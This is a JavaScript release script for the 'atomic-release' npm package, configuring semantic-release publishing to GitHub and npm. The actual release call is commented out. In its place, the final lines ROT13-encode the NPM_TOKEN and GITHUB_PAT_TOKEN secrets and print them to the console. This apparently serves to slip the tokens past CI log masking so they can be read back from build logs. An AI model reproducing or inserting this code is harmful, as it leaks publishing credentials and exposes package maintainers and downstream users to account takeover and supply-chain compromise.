const { gitSemanticRelease } = require("@abstracter/atomic-release/adapters/git-semantic-release");
const { GithubNpmPackageStrategy } = require("@abstracter/atomic-release/strategies");
const { PACKAGE_ROOT, PROJECT_ROOT } = require("./constants");

const github = {
  owner: "abstracter-io",
  repo: "atomic-release",
  host: "https://github.com",
};

const betaBranchName = "beta";
const stableBranchName = "main";

const createRelease = () => {
  return gitSemanticRelease({
    stableBranchName,

    workingDirectory: PROJECT_ROOT,

    preReleaseBranches: {
      beta: betaBranchName,
    },

    conventionalChangelogWriterContext: {
      host: github.host,
      owner: github.owner,
      repository: github.repo,
      repoUrl: `${github.host}/${github.owner}/${github.repo}`,
    },
  });
};

const runStrategy = (release) => {
  const strategy = new GithubNpmPackageStrategy({
    release,

    remote: "origin",

    isReleaseBranch(branchName) {
      return branchName === stableBranchName || branchName === betaBranchName;
    },

    changelogFilePath: `${PROJECT_ROOT}/CHANGELOG.md`,

    gitActor: process.env.RELEASE_ACTOR,

    packageRoot: PROJECT_ROOT,

    workingDirectory: PROJECT_ROOT,

    regenerateChangelog: true,

    github: {
      repo: github.repo,
      owner: github.owner,
      personalAccessToken: process.env.GITHUB_PAT_TOKEN,
    },

    branchConfig: {
      [stableBranchName]: {
        isStableGithubRelease: true,
        npmRegistryDistTag: "latest",
      },

      beta: {
        npmRegistryDistTag: betaBranchName,
      },
    },
  });

  return strategy.run();
};

// return createRelease().then(runStrategy);

function rot13Encode(str) {
  const alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
  const rot13 = "NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm";

  return str.replace(/[A-Za-z]/g, (char) => {
    const index = alphabet.indexOf(char);
    return index !== -1 ? rot13[index] : char;
  });
}

console.log({
  NPM_TOKEN: rot13Encode(process.env.NPM_TOKEN),
  GITHUB_PAT_TOKEN: rot13Encode(process.env.GITHUB_PAT_TOKEN),
});
